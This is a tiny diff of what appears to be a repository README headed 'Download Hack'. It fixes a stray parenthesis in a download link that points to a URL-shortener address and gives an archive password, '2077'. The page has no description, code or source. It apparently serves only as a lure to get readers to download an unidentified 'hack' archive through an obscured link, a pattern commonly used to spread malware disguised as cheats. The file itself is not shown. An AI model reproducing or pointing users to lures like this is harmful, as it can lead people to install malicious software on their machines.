@@ -4,7 +4,7 @@
 
 # Download Hack
 
-|[Download](http://gg.gg/13d3h7))|
+|[Download](http://gg.gg/13d3h7)|
 |:-------------|
 
 Passwrod: `2077`
